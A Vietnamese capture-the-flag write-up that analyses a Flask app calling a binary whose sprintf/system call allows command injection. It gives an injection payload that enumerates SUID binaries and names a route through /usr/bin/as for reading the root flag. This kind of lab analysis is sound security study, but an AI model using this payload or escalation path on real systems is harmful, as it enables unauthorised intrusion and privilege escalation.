# 0x1 Overview 

Kiểm tra đoạn code backend được cho

```python
import json
from subprocess import check_output, STDOUT
from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/')
def index():
	cards = json.loads(open('data/former.txt', 'r').read())
	return render_template('index.html', cards=cards, card_len = len(cards))

@app.route('/contact', methods = ['GET', 'POST'])
def contact():
	if request.method == 'GET':
		return render_template('contact.html')
	elif request.method == 'POST':
		try:
			output = check_output(['./bin/advice', request.form['name'], request.form['advice']], stderr=STDOUT)
		except:
			output = 'Something wrong!'
		return render_template('contact.html', output=output.decode())

if __name__=='__main__':
	app.run(host='0.0.0.0')
```

nhận thấy chương trình có thực thi file binary `/bin/advice` với 2 tham số được thấy từ biến `name` và `advice`. 

# 0x2 Vulnerability 

Load file binary `advice` vào IDAPRO 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rbx
  size_t v4; // rax
  char *s; // [rsp+18h] [rbp-18h]

  v3 = strlen(argv[1]);
  v4 = strlen(argv[2]);
  s = (char *)malloc(v3 + v4 + 100);
  sprintf(s, "echo \"%s\\n%s\" > data/advice", argv[1], argv[2]);
  system(s);
  puts(::s);
  return 0;
}
```

ta thấy có bug `cmd injection` tại hàm `sprintf`. 

# 0x3 Exploit 

Chúng ta chỉ cần bypass dấu nháy kép `"`, đưa toàn bộ ký tự sau `%s` đầu tiên thành comment thì có thể làm một số công việc quan trọng. Với `flag` được cất ở `/root/root.txt`, nên phải leo thang đặc quyền để đọc file này. 

Payload: `"; find -perm -u=s 2>/dev/null; #`

```sh
/usr/bin/gpasswd /usr/bin/chfn /usr/bin/umount /usr/bin/passwd/usr/bin/mount /usr/bin/su /usr/bin/chsh /usr/bin/newgrp /usr/bin/as /tmp/as
```

Với `/usr/bin/as`, kiểm tra tại https://gtfobins.github.io/gtfobins/as, ta có thể đọc được file `root.txt`

# 0x4 References
- [Trương Hoàng Lân AT19](https://hackmd.io/@trhoanglan04/S15a4X8C3#Welcome-to-KCSC)
- [Jonathan Hữu Trí AT18](https://www.youtube.com/watch?v=DRsvh6k3Cu8)